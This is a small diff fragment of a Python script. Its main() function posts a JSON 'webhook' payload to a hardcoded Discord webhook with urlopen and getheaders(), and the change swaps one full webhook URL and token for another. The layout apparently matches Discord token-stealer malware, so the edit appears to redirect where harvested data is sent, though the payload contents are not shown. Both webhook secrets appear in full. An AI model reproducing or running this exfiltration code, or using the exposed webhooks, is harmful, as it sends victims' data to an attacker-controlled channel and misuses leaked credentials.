@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://cdn.discordapp.com/attachments/840487014934642721/840573649581113404/chennal_art_fade.png"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/842670576677814292/x6AJt5CcuKtDX4JzZpPxztOsOXYHs0NFWv2i6ASDiw37AusGXgo9fT2GaJBCIAGQn8fE", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/840569180017393684/23F6RDPvdhx_4_WQ1N9V14YNwUuHH41MnY3swMo2IYD7PnCu2J7yP2nMSO1JGiwkw6bq", data=dumps(webhook).encode(), headers=getheaders()))
 
 
 
